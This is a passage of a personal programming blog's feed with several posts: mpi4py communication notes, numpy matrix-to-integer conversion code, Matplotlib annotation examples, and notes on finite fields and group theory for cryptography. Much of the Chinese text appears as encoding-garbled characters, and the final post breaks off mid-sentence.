        <content type="html"><![CDATA[<h1 id="mpi4py">MPI4py</h1><ol type="1"><li><p>åˆ†å¸ƒå¼ç¯å¢ƒä¸‹ï¼Œå†…å­˜ä¸å¯èƒ½å…±äº«ï¼Œå› æ­¤ä¸å¯èƒ½åœ¨æ‰€æœ‰rank/è¿›ç¨‹ä¹‹é—´è®¾ç½®ä¸€ä¸ªå…±äº«å˜é‡</p></li><li><p>mpi4py åº”ç”¨åœ¨è”é‚¦å­¦ä¹ çš„ä»£ç  <ahref="https://github.com/beiyuouo/mpi-federated-learning-simulation.git">mpi-federated-learning-simulation</a></p></li><li><p>comm.recv() ä¸­çš„ statuså‚æ•°å¯ä»¥è·å–æ¥æ”¶åˆ°çš„æ¶ˆæ¯çš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚æ¶ˆæ¯æ¥æº ä½¿ç”¨æ–¹æ³•å‚è€ƒï¼š <ahref="https://stackoverflow.com/questions/21088420/mpi4py-send-recv-with-tag">python- mpi4py Send/Recv with tag - Stack Overflow</a></p></li><li><p>é˜»å¡é€šä¿¡ä¸éé˜»å¡é€šä¿¡:</p><ol type="1"><li><p>é˜»å¡é€šä¿¡ï¼š Python objects with blocking communication:<code>comm.send</code> <code>comm.recv</code> Numpy objects withnon-blocking communication: <code>comm.Send</code><code>comm.Recv</code></p></li><li><p>éé˜»å¡é€šä¿¡ï¼š Python objects with non-blocking communication:<code>comm.isend</code> <code>comm.irecv</code> Numpy objects withnon-blocking communication: <code>comm.Isend</code><code>comm.Irecv</code> æ³¨æ„ï¼š irecv å¯ä»¥æ²¡æœ‰ç¼“å†²åŒºæ¥æ”¶ï¼Œé€šè¿‡data=req.wait() æ¥è¿”å›æ•°æ® ä½†æ˜¯ Irecv å¿…é¡»æœ‰ç¼“å†²åŒº</p><p>(method) def irecv( buf: Buffer | None = None, source: int =ANY_SOURCE, tag: int = ANY_TAG ) -&gt; Request</p><p>(method) def Irecv( buf: BufSpec, source: int = ANY_SOURCE, tag: int= ANY_TAG ) -&gt; Request</p></li></ol></li><li><p>æ³¨æ„ç»Ÿä¸€å‘é€å’Œæ¥æ”¶çš„æ•°æ®çš„æ ¼å¼ï¼Œä¸€å®šè¦ç¡®è®¤æ ¼å¼ä¸€è‡´ï¼Œä¸€æ—¦å‡ºç°å‘é€çš„dtype å’Œæ¥æ”¶çš„ dtypeä¸ä¸€è‡´çš„æƒ…å†µï¼Œæœ€ç»ˆç»“æœã€å‡†ç¡®ç‡å°±ä¼šå—åˆ°å½±å“ã€‚</p></li><li><p>å‚è€ƒèµ„æ–™</p><p><a href="https://www.ceci-hpc.be/assets/training/mpi4py.pdf">MPI4pycrash course</a></p></li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://buildmedia.readthedocs.org/media/pdf/mpi4py/stable/mpi4py.pdf">MPIfor Python</a> <ahref="https://stackoverflow.com/questions/16672587/defining-global-variables-in-mpi">c++- Defining global variables in mpi - Stack Overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>convertion between numpy matrix and list of integers</title>
      <link href="/blog/2023/03/15/programming/python/ai/nparr_ints/"/>
      <url>/blog/2023/03/15/programming/python/ai/nparr_ints/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix2Int</span>(<span class="params">data_matrix</span>): <span class="comment"># data_matrix is a numpy matrix2Int</span></span><br><span class="line">    data_bytes, bytes_per_elem, data_shape = data_matrix.tobytes(), data_matrix.itemsize,data_matrix.shape</span><br><span class="line">    int_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data_bytes), bytes_per_elem):</span><br><span class="line">        int_list.append(<span class="built_in">int</span>.from_bytes(data_bytes[i:i+bytes_per_elem-<span class="number">1</span>], byteorder=sys.byteorder))</span><br><span class="line">    <span class="keyword">return</span> int_list, data_shape, data_matrix.dtype</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2Matrix</span>(<span class="params">int_list, data_shape, data_dtype</span>):</span><br><span class="line">    <span class="comment"># 4. int to bytes</span></span><br><span class="line">    bytes_per_elem = np.dtype(data_dtype).itemsize</span><br><span class="line">    recovered_bytes = [i.to_bytes(</span><br><span class="line">        bytes_per_elem, byteorder=sys.byteorder) <span class="keyword">for</span> i <span class="keyword">in</span> int_list]</span><br><span class="line">    <span class="comment"># print(f&quot;recovered_bytes:&#123;recovered_bytes&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># 5. bytes to numpy array</span></span><br><span class="line">    y = np.frombuffer(<span class="string">b&#x27;&#x27;</span>.join(recovered_bytes), dtype=data_dtype)</span><br><span class="line">    <span class="keyword">return</span> y.reshape(data_shape)</span><br></pre></td></tr></table></figure><p><code>.tobytes()</code> å°† numpyçŸ©é˜µè½¬æ¢ä¸ºå­—èŠ‚å­—ç¬¦ä¸²ï¼Œ<code>.itemsize</code>è·å¾—çŸ©é˜µä¸­å•ä¸ªå…ƒç´ çš„å­—èŠ‚å¤§å°ï¼Œä¾¿äºåç»­æ¢å¤å…ƒç´ ç±»å‹ï¼Œä¾‹å¦‚ float64ï¼Œint64ç­‰ã€‚</p><p>å¤§æ•´æ•°å’Œå­—èŠ‚å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢æ“ä½œå¹¶ä¸å¸¸è§ã€‚ç„¶è€Œï¼Œåœ¨ä¸€äº›åº”ç”¨é¢†åŸŸæœ‰æ—¶å€™ä¹Ÿä¼šå‡ºç°ï¼Œæ¯”å¦‚å¯†ç å­¦æˆ–è€…ç½‘ç»œã€‚</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c03/p05_pack_unpack_large_int_from_bytes.html#id1">3.5å­—èŠ‚åˆ°å¤§æ•´æ•°çš„æ‰“åŒ…ä¸è§£åŒ… â€” python3-cookbook 3.0.0 æ–‡æ¡£</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Matplotlib Annotation</title>
      <link href="/blog/2023/03/15/programming/python/ai/plot_annotation/"/>
      <url>/blog/2023/03/15/programming/python/ai/plot_annotation/</url>
      
        <content type="html"><![CDATA[<p>Matplotlib ä¸­æœ‰ä¸¤ç§æ ‡æ³¨ï¼Œä¸€ç§æ˜¯æ— æŒ‡å‘æ€§æ ‡æ³¨ textï¼Œå¦ä¸€ç§æ˜¯æŒ‡å‘æ€§æ³¨é‡Šannotateã€‚</p><p>æ— æŒ‡å‘æ€§æ ‡æ³¨ text:<code>plt.text(-0.5, 5, "two functions", family="Times New Roman", fontsize=18, fontweight="bold", color='red')</code># åœ¨ x ä¸º-0.5ï¼Œy ä¸º 5 çš„åŒºåŸŸå¼€å§‹æ–‡æœ¬æ ‡æ³¨</p><p>æŒ‡å‘æ€§æ³¨é‡Š annotateã€‚ annotate()å‡½æ•°ç”¨äºæ³¨é‡Šï¼Œxyå‚æ•°ä»£è¡¨ç®­å¤´æŒ‡å‘çš„ç‚¹ï¼Œxytext ä»£è¡¨æ–‡æœ¬æ ‡æ³¨å¼€å§‹çš„ç‚¹ï¼š</p><h2 id="åŠ -circle">åŠ  circle</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"># draw cicle,(point[0], point[1]) is the center of the circle</span><br><span class="line">plt.plot(x_points[0], y_points[0], &#x27;o&#x27;,ms=radius * 2, mec=&#x27;black&#x27;, mfc=&#x27;none&#x27;, mew=2)</span><br><span class="line"></span><br><span class="line"># draw arrow pointing the circle</span><br><span class="line">plt.annotate(&quot;Attack stop&quot;, xy=(x_points[0], y_points[0]), xytext=(</span><br><span class="line">    x_points[0]+2, y_points[0]-29), arrowprops=dict(arrowstyle=&#x27;simple,tail_width=0.2,head_width=0.6,head_length=0.8&#x27;, facecolor=&#x27;black&#x27;, shrinkB=radius * 1.2), fontsize=15)</span><br></pre></td></tr></table></figure><p><code>plt.annotate</code>:</p><ol type="1"><li><code>xy(float, float)</code>: The point (x, y) to annotate. Thecoordinate system is determined by xycoords.</li><li><code>xytext(float, float)</code>, default: xy: The position (x, y)to place the text at. The coordinate system is determined bytextcoords.</li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://www.tutorialspoint.com/how-do-i-put-a-circle-with-annotation-in-matplotlib">Howdo I put a circle with annotation in matplotlib</a> <ahref="https://matplotlib.org/stable/api/_as_gen/matplotlib.pyplot.annotate.html">matplotlib.pyplot.annotateâ€” Matplotlib 3.7.2 documentation</a></p><p><ahref="https://turingplanet.org/2021/09/28/matplotlib-intro-4/">å›¾ä¾‹Legendï¼Œæ ‡æ³¨(Textï¼ŒAnnotate)ã€Matplotlib å…¥é—¨æ•™ç¨‹ 4ã€‘ â€“TuringPlanet</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3.æ•°è®ºä¸ç¾¤è®ºç»“åˆï¼šæ•´æ•°æ¨¡ n ä¹˜æ³•ç¾¤</title>
      <link href="/blog/2023/03/14/crypto/math/3.integer_modular_group/"/>
      <url>/blog/2023/03/14/crypto/math/3.integer_modular_group/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°è®ºä¸ç¾¤è®ºç»“åˆæ•´æ•°æ¨¡-n-ä¹˜æ³•ç¾¤">3.æ•°è®ºä¸ç¾¤è®ºç»“åˆï¼šæ•´æ•°æ¨¡ nä¹˜æ³•ç¾¤</h1><h2 id="æœ‰é™åŸŸä¸æ•°è®ºç»“åˆ">æœ‰é™åŸŸä¸æ•°è®ºç»“åˆ</h2><p>ä»£æ•°ç»“æ„ç ”ç©¶ä¸€ä¸ªç‰¹å®šå¯¹è±¡çš„éç©ºé›†åˆåŠå…¶ä¹‹å‰çš„æ“ä½œã€‚æœ‰é™åŸŸ (finitefield) æˆ–è€…ä¼½ç½—ç“¦åŸŸ (Galois Field).æœ‰é™åŸŸæ˜¯å®šä¹‰åœ¨ä¸€ç±»ç‰¹å®šçš„å¯¹è±¡ä¸Šï¼Œæ»¡è¶³åŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•å’Œé™¤æ³•è¿ç®—çš„ä»£æ•°ç»“æ„ã€‚è€Œæ•°è®ºç ”ç©¶æ•´æ•°ä»¥åŠæ•´æ•°å€¼å‡½æ•°ã€‚</p><p>æœ‰é™åŸŸæ˜¯ä¸€ç§æ•°å­¦å¯¹è±¡ï¼Œå®ƒæ—¢å±äºæ•°è®ºï¼Œä¹Ÿå±äºæŠ½è±¡ä»£æ•°çš„ç ”ç©¶èŒƒç•´ã€‚æœ€å¸¸è§çš„æœ‰é™åŸŸæ˜¯Fp = (Zp,+,x) <strong>æ•´æ•°æ¨¡ç´ æ•° p æœ‰é™åŸŸ</strong>ã€‚Number theoryæ‰€ç ”ç©¶çš„æ•´æ•°ä½œä¸º algebraic structure ç¾¤ä¸­çš„ objectsç»„æˆé›†åˆï¼Œå…ƒç´ ä¹‹é—´è¿›è¡Œæ¨¡ç®—æœ¯è¿ç®—ã€‚å…¶ä»£æ•°æ“ä½œåŒ…æ‹¬åŸºäºèŒƒç•´è®ºè¡ç”Ÿçš„ç¾¤ä¸ç¾¤ä¹‹é—´çš„åŒæ€æ˜ å°„æ“ä½œï¼ŒåŸºäºæ•°è®ºè¡ç”Ÿçš„å•ä¸ªç¾¤å†…éƒ¨çš„æ•°ä¹‹é—´çš„å‡½æ•°ä»¥åŠæ“ä½œã€‚</p><p>æ•°è®ºä¸­çš„æ¨¡ç®—æœ¯ï¼ˆmodular arithmeticï¼‰å’Œæœ‰é™åŸŸçš„å¾ªç¯ç¾¤ï¼ˆcyclicgroupï¼‰å…·å¤‡ç›¸ä¼¼çš„ç»“æ„ä¸è§„åˆ™ã€‚æ¨¡è¿ç®—çš„æ€§è´¨å¯ä»¥è¦†ç›–ç¾¤ç¯åŸŸæ‰€æ¶‰åŠçš„å°é—­æ€§ï¼Œç»“åˆå¾‹ï¼ˆåŠ æ³•æ€§ï¼Œä¹˜æ³•æ€§ï¼‰ï¼Œå•ä½åœ†ï¼Œé€†å…ƒï¼ˆæ¨¡é€†å…ƒï¼‰ï¼Œäº¤æ¢å¾‹ï¼Œå› æ­¤æ•°è®ºçš„æ¨¡è¿ç®—å’Œç¾¤è®ºçš„ç¾¤ç¯åŸŸç»“åˆï¼Œå½¢æˆäº†æœ€å¸¸è§æœ€æœ‰ç”¨çš„æ•´æ•°æ¨¡ç´ æ•°p æœ‰é™åŸŸ GF(p)ã€‚</p><p>æœ‰é™åŸŸæ¶‰åŠæŠ½è±¡ä»£æ•°çš„çŸ¥è¯†ä¸»è¦æœ‰ï¼š</p><ol type="1"><li>åŸŸçš„åŸºæœ¬æ¦‚å¿µå’Œæ€§è´¨ï¼Œå¦‚äº¤æ¢ç¯ã€æ•´ç¯ã€åŸŸã€ç´ åŸŸã€åŒæ„ã€åŒæ€ã€è‡ªåŒæ„ç­‰ã€‚</li><li>åŸŸçš„æ‰©å¼ ï¼Œ<span class="math inline">\(F_p\)</span> æ‰©å¼ åˆ° <spanclass="math inline">\(F_{p^n}\)</span>ã€‚</li><li>åŸŸçš„åº”ç”¨ï¼Œå¦‚ä¼½ç½—ç“¦ç†è®ºã€å¯è§£æ€§ã€æ ¹å¼è§£ã€åŸºæœ¬å®šç†ã€ä¸å¯çº¦å¤šé¡¹å¼ã€æœ‰é™åŸŸã€å¾ªç¯åŸŸç­‰ã€‚</li></ol><p>æœ‰é™åŸŸæ¶‰åŠæ•°è®ºçš„çŸ¥è¯†ä¸»è¦æœ‰åŸŸçš„ç®—æœ¯ï¼Œå¦‚æ¬§å‡ é‡Œå¾—ç®—æ³•ã€è¾—è½¬ç›¸é™¤æ³•ã€æœ€å¤§å…¬å› æ•°ã€æœ€å°å…¬å€æ•°ã€äº’ç´ ã€æ¨¡è¿ç®—ã€åŒä½™ã€æ¬§æ‹‰å‡½æ•°ã€è´¹é©¬å°å®šç†ã€æ¬§æ‹‰å®šç†ç­‰ã€‚</p><h2 id="æœ‰é™åŸŸä»‹ç»">æœ‰é™åŸŸä»‹ç»</h2><p>å¦‚æœåŸŸ FåªåŒ…å«æœ‰é™ä¸ªå…ƒç´ ï¼Œåˆ™ç§°å…¶ä¸ºæœ‰é™åŸŸã€‚æœ‰é™åŸŸä¸­å…ƒç´ çš„ä¸ªæ•°ç§°ä¸ºæœ‰é™åŸŸçš„é˜¶(order)ã€‚å°½ç®¡å­˜åœ¨æœ‰æ— é™ä¸ªå…ƒç´ çš„æ— é™åŸŸï¼Œä½†åªæœ‰æœ‰é™åŸŸåœ¨å¯†ç ç¼–ç å­¦ä¸­å¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨ã€‚<strong>æ¯ä¸ªæœ‰é™åŸŸçš„é˜¶å¿…ä¸ºç´ æ•°çš„å¹‚ï¼ˆæ³¨ï¼šç´ æ•°çš„å¹‚ä¸æ˜¯ç´ æ•°ï¼‰</strong>ï¼Œå³æœ‰é™åŸŸçš„é˜¶å¯è¡¨ç¤ºä¸ºpâ¿ï¼ˆp æ˜¯ç´ æ•°ã€n æ˜¯æ­£æ•´æ•°ï¼‰ï¼Œè¯¥æœ‰é™åŸŸé€šå¸¸ç§°ä¸º Galois åŸŸ (GaloisFields)ï¼Œè®°ä¸º GF(pâ¿)ã€‚</p><p>å½“ n = 1 æ—¶ï¼Œå­˜åœ¨æœ‰é™åŸŸ GF(p)ï¼Œä¹Ÿç§°ä¸ºç´ æ•°åŸŸ (prime field),ä¹Ÿå†™åš<spanclass="math inline">\(\mathbb{F}_p\)</span>ã€‚åœ¨å¯†ç å­¦ä¸­ï¼Œæœ€å¸¸ç”¨çš„åŸŸæ˜¯é˜¶ä¸ºp çš„ç´ æ•°åŸŸ <span class="math inline">\(\mathbb{F}_p\)</span>ï¼‰æˆ–é˜¶ä¸º<span class="math inline">\(2^n\)</span> çš„ GF(2^n) åŸŸã€‚</p><h2 id="æ•´æ•°æ¨¡-n-ä¹˜æ³•ç¾¤">æ•´æ•°æ¨¡ n ä¹˜æ³•ç¾¤</h2><p>Multiplicative group of integers modulo n : the elements of thisgroup can be thought of as the congruence classes, also known asresidues modulo n, denoted by <spanclass="math inline">\((Z/nZ)^*\)</span>ï¼ˆ<code>*</code>è¡¨ç¤ºæ­£æ•°ï¼Œ0 å±äºN é›†å’Œ Z é›†ï¼Œä½†ä¸å±äº <span class="math inline">\(N^*\)</span> é›†ï¼‰</p><p>æ•´æ•°æ¨¡ n ä¹˜æ³•ç¾¤æ˜¯ç”±æ¨¡ n çš„äº’è´¨åŒä½™ç±»ç»„æˆçš„ï¼Œ0æ²¡æœ‰é€†å…ƒï¼Œæ‰€ä»¥ä¸åŒ…å«åœ¨æ•´æ•°æ¨¡ n ä¹˜æ³•ç¾¤ä¸­ã€‚æ•´æ•°æ¨¡ n ä¹˜æ³•ç¾¤çš„é˜¶ä¸º nã€‚</p><ol type="1"><li><p>ä»ç¾¤è®ºè§’åº¦ç†è§£ n ä¸ºè´¨æ•°æ—¶ï¼Œæ¯ä¸ªå…ƒç´ æœ‰é€†å…ƒï¼Œæ¨¡ næ•´æ•°æ‰èƒ½æ„æˆç¾¤ã€‚</p><p>æ¨¡ç®—æœ¯çš„å‰©ä½™ç±» (Z/nZ, +) is <span class="math inline">\(C_n\)</span>å¯ä»¥ç»„æˆä¸€ä¸ª cyclic groupsã€‚</p><p>å¯¹äº Z/nZ æ¥è¯´ï¼Œn ä¸ºè´¨æ•°æ—¶ï¼Œæ ¹æ®æ¬§æ‹‰å‡½æ•°ï¼Œä»»æ„å…ƒç´  <spanclass="math inline">\(a^{\varphi(n)} \equiv 1 \mod n\)</span>,å› æ­¤è¯¥å…ƒç´ é€šè¿‡æ‹†åˆ† <span class="math inline">\(\varphi(n)\)</span>å°±å­˜åœ¨é€†å…ƒï¼Œæ ¹æ®å°é—­æ€§ï¼Œå®ƒçš„ä¸åŒå¹‚æ¬¡ä¹Ÿæ˜¯é›†åˆå…ƒç´ ï¼Œä¹Ÿå°±ç”Ÿæˆäº†ç¾¤ï¼Œä¹Ÿå°±æ˜¯ç”Ÿæˆå…ƒï¼Œæ‰€ä»¥n æ˜¯ç´ æ•°æ—¶ï¼Œn ä¸æ¯ä¸ªå…ƒç´ äº’è´¨ï¼Œåˆ™æ¯ä¸ªå…ƒç´ éƒ½æ˜¯å¾ªç¯ç¾¤çš„ç”Ÿæˆå…ƒã€‚</p><blockquote><p>The class <span class="math inline">\([m]_n\)</span> generates Z/nZif and only if gcd(m, n) = 1</p></blockquote></li><li><p>ä»æ•°è®ºè§’åº¦ç†è§£ï¼šp æ˜¯ç´ æ•°ï¼Œæ¨¡ p ä¹˜æ³•æ„æˆç¾¤ï¼š</p><p>å¦‚æœ p æ˜¯åˆæ•°ï¼Œé‚£ä¹ˆ $ ax p$ çš„ç»“æœï¼Œå³ <spanclass="math inline">\(ax-kp\)</span> çš„ç»“æœå¿…ä¸ºäºŒè€…å…¬å› å­çš„ gcd(aï¼Œp),è€ŒäºŒè€…å…¬å› å­ä¸æ˜¯ 1ï¼Œæ‰€ä»¥å…¶ä¸­ä»»æ„ä¸äº’è´¨å…ƒç´  a ä¸æ˜¯ä¹˜æ³•é€†å…ƒã€‚</p><p><code>s = a*b, t = a*c, sx mode t, abx-kac=a(bx-kc) ä¸ºäº†è®©å…¶æœ€å° bx-kc=1</code>,å¦‚æœ p æ˜¯è´¨æ•°ï¼Œé‚£ä¹ˆ <span class="math inline">\(gcd(a, p)=1\)</span> ,ax+py=1 å¯ä»¥æ±‚å‡ºé€†å…ƒã€‚</p></li></ol><h2 id="æ¨¡-n-æœ‰é™åŸŸ">æ¨¡ n æœ‰é™åŸŸ</h2><p>æ¨¡ n æ•´æ•°ç¯ âŸ¨Zn,+,xâŸ© æ˜¯äº¤æ¢ç¯, å«å¹ºç¯. å½“ n ä¸ºç´ æ•°æ—¶å¯ä»¥è¯æ˜ Znæ„æˆåŸŸ; å½“ n ä¸ºåˆæ•°æ—¶ä¸æ„æˆæ•´ç¯å’ŒåŸŸ.</p><p>n ä¸ä¸ºç´ æ•°ï¼Œåˆ™åªæœ‰ä¸ näº’è´¨çš„å…ƒç´ ï¼Œæ‰æœ‰é€†å…ƒï¼Œä¸æ˜¯æ‰€æœ‰çš„å…ƒç´ éƒ½æœ‰é€†å…ƒï¼Œæ‰€ä»¥æ˜¯ï¼ˆZn,x)åªæ˜¯å…·å¤‡äº¤æ¢å¾‹çš„å¹ºåŠç¾¤ï¼Œè€Œä¸æ˜¯äº¤æ¢ç¾¤ã€‚è€Œå½“ n ä¸ºç´ æ•°ï¼Œåˆ™ nä¸æ¯ä¸ªå…ƒç´ äº’è´¨ï¼Œå³æ¯ä¸ªå…ƒç´ å­˜åœ¨é€†å…ƒï¼Œï¼ˆZn,x) ä¾¿æˆäº†äº¤æ¢ç¾¤ï¼ŒâŸ¨Zn,+,xâŸ©ä¾¿æˆäº†åŸŸï¼Œæ‰€ä»¥è¯´ï¼šæ¨¡ p çš„æœ‰é™åŸŸâŸ¨Zp,+,xâŸ©ï¼Œpè‚¯å®šæ˜¯ç´ æ•°ï¼Œå¦åˆ™å°±ä¸æ˜¯åŸŸäº†ã€‚</p><h2 id="gfpn">GF(p^n)</h2><p>GF(p^n) æ˜¯ GF(p)æ‰©åŸŸè€Œå¾—ï¼Œå®ƒä¸å†æ˜¯æŒ‡å•çº¯çš„æ•°ï¼Œè€Œæ˜¯<strong>ä»æ•°æ‰©å±•åˆ°å¤šé¡¹å¼</strong>ã€‚ä¸€èˆ¬è€Œè¨€,æ‰€æœ‰æœ‰é™åŸŸéƒ½å½¢å¦‚ <span class="math inline">\(F_{p^n}\)</span>, å…¶ä¸­ pæ˜¯ç´ æ•°, n æ˜¯æ­£æ•´æ•°. è¯¥æœ‰é™åŸŸæœ‰ <span class="math inline">\(p^n\)</span>ä¸ªå…ƒç´ , å¯ä»¥ä» Fp é€šè¿‡æ‰©åŸŸå¾—åˆ°ã€‚ä¾‹å¦‚, è€ƒè™‘åŸŸ</p><p><span class="math display">\[\mathbb{F}_3[\sqrt{-1}]=\left\{a+b\sqrt{-1} \mid a, b \in \mathbb{F}_3\right\} \]</span></p><p>å¯ä»¥éªŒè¯å®ƒåœ¨è‡ªç„¶çš„åŠ æ³•ã€ä¹˜æ³•ä¸‹æ„æˆåŸŸ. å®ƒæœ‰ 9 ä¸ªå…ƒç´ , å› æ­¤è¿™æ ·å°±é€šè¿‡<span class="math inline">\(F_3\)</span> çš„æ‰©åŸŸå¾—åˆ°äº†æœ‰é™åŸŸ <spanclass="math inline">\(F_9\)</span></p><h3 id="è´¹é©¬å°å®šç†æ¬§æ‹‰å®šå¾‹">è´¹é©¬å°å®šç†/æ¬§æ‹‰å®šå¾‹</h3><p>è´¹é©¬å°å®šç†æ¨è®ºåˆ°ç¾¤ï¼šè‹¥ç¾¤ G ä¸º n é˜¶å¾ªç¯ç¾¤ï¼Œa ä¸º G çš„ç”Ÿæˆå…ƒï¼Œåˆ™a^n=e</p><p>ç¾¤æ¨è®ºåˆ°è´¹é©¬å°å®šç†ï¼šæ¨¡ç´ æ•° p å•ä½ç¾¤ <spanclass="math inline">\(Z^*_p\)</span> ä¸­ a ä¸ ç´ æ•° p äº’ç´ ï¼Œ æ¬§æ‹‰å‡½æ•°<span class="math inline">\(\varphi(p)=p-1\)</span>ï¼Œåˆ™ <spanclass="math inline">\(a^{\varphi(p)}=a^{p-1} \equiv 1 \modp\)</span>ï¼Œæ‰€ä»¥æ¨å‡ºè´¹é©¬å°å®šç† <span class="math inline">\(a^{p-1}\equiv a \mod p\)</span></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li>A visit to group theory and elementary number theory Zhen DING</li><li><a href="https://en.wikipedia.org/wiki/Number_theory">Number theory- Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/Finite_field">Finite field -Wikipedia</a></li><li><ahref="https://www.cnblogs.com/RioTian/p/15081092.html">ã€ç®—æ³•å­¦ä¹ ç¬”è®°ã€‘æ¨¡è¿ç®—æ€»ç»“- RioTian - åšå®¢å›­</a></li><li><a href="https://mathworld.wolfram.com/PrimeField.html">Prime Field-- from Wolfram MathWorld</a></li><li><ahref="https://baike.baidu.com/item/%E6%9C%89%E9%99%90%E5%9F%9F/4273049">æœ‰é™åŸŸ_ç™¾åº¦ç™¾ç§‘</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1. ç¾¤çš„æ€§è´¨ä¸å¸¸è§ç¾¤</title>
      <link href="/blog/2023/03/10/crypto/math/1.groups/"/>
      <url>/blog/2023/03/10/crypto/math/1.groups/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¾¤çš„æ€§è´¨ä¸å¸¸è§ç¾¤">1. ç¾¤çš„æ€§è´¨ä¸å¸¸è§ç¾¤</h1><h2 id="ç¾¤çš„é˜¶">ç¾¤çš„é˜¶</h2><p>ç¾¤ G çš„é˜¶ï¼ˆorderï¼‰å®šä¹‰ä¸ºç¾¤æ‰€å«å…ƒç´ çš„ä¸ªæ•°ï¼Œç”¨ç¬¦å·è¡¨ç¤ºä¸º: |G| æˆ–ord(G)ã€‚</p><p>å¦‚æœ Gçš„å…ƒç´ ä¸ºæ— é™ä¸ªï¼Œåˆ™ç§°ä¸ºæ— é™ç¾¤ï¼Œå…¶é˜¶ä¸ºæ— é™å¤§ã€‚å¦‚æœå…ƒç´ ä¸ºæœ‰é™ä¸ªï¼Œåˆ™ç§°ä¸ºæœ‰é™ç¾¤ã€‚</p><p>ç¾¤é‡Œé¢çš„å…ƒç´ ä¹Ÿå®šä¹‰äº†é˜¶ï¼Œç¾¤é‡Œé¢ä»»æ„å…ƒç´  a çš„é˜¶å®šä¹‰ä¸ºæœ€å°çš„æ­£æ•´æ•°ï¼Œä½¿å¾— <span class="math inline">\(a^m = e\)</span>ï¼Œå…¶ä¸­ eä¸ºç¾¤çš„å•ä½å…ƒã€‚å¦‚æœè¿™æ ·çš„æ­£æ•´æ•° m ä¸å­˜åœ¨ï¼Œåˆ™è¡¨ç¤º a çš„é˜¶ä¸ºæ— é™å¤§ã€‚å…ƒç´  açš„é˜¶ç”¨ç¬¦å·è¡¨ç¤ºä¸ºï¼š|a| æˆ– ord(a)ã€‚</p><h2 id="æ±‚å¹‚">æ±‚å¹‚</h2><p>ç»™å®šç¾¤ï¼ˆGï¼ŒÂ·ï¼‰å¯¹ä»»æ„ä¸€ä¸ªå…ƒç´  a åº”ç”¨ n æ¬¡è¿ç®—ç¬¦ â€œÂ·â€ï¼Œè¡¨ç¤ºä¸º <spanclass="math inline">\(a^n = aÂ·Â·aÂ·aÂ·Â·Â·a\)</span></p><p><span class="math inline">\(a^n\)</span> å«åš a çš„ næ¬¡å¹‚ã€‚æ³¨æ„å®šä¹‰åœ¨ç¾¤ (G,Â·) ä¸Šçš„ <span class="math inline">\(a^n\)</span>ä¸èƒ½å•çº¯çš„ç†è§£ä¸ºå¹³æ—¶æ‰€è§çš„ä¹˜æ–¹ã€‚å®ƒè¡¨ç¤ºåœ¨ä¸€ä¸ªå…ƒç´ ä¸Šå¯¹æŠ½è±¡çš„äºŒå…ƒè¿ç®—çš„é‡å¤å¤šæ¬¡ä½¿ç”¨ã€‚</p><p>ä¾‹å¦‚å½“ G è¡¨ç¤ºå®šä¹‰åœ¨åŠ æ³•ä¸Šçš„ç¾¤æ—¶ï¼Œ<span class="math inline">\(a^n =a+a+Â·Â·Â·+a\)</span>ã€‚</p><h2 id="ä»èŒƒç•´è®ºçœ‹-group-å…³ç³»">ä»èŒƒç•´è®ºçœ‹ group å…³ç³»</h2><p>èŒƒç•´è®ºæ˜¯ç ”ç©¶ç‰¹å®šå¯¹è±¡é›†åˆä»¥åŠä»–ä»¬ä¹‹é—´å…³ç³»çš„ç†è®ºã€‚A Category is thecontent of a specific â€setâ€ of things and the possible connectionsbetween things.</p><blockquote><p>Category theory is a general theory of mathematical structures andtheir relations. A category is formed by two sorts of objects: theobjects of the category, and the morphisms, which relate two objectscalled the source and the target of the morphism.</p></blockquote><p>èŒƒç•´è®ºå°† set æ¨å¹¿ï¼šThe category Set contains all sets and allpossible functions between setsã€‚</p><h3 id="group-homomorphism">Group Homomorphism</h3><p>å½“æˆ‘ä»¬ç ”ç©¶ group çš„æ—¶å€™ï¼Œç ”ç©¶ "category of group" ä»¥åŠ "functionsbetween group" æ˜¯éå¸¸è‡ªç„¶çš„äº‹æƒ…ï¼Œå› 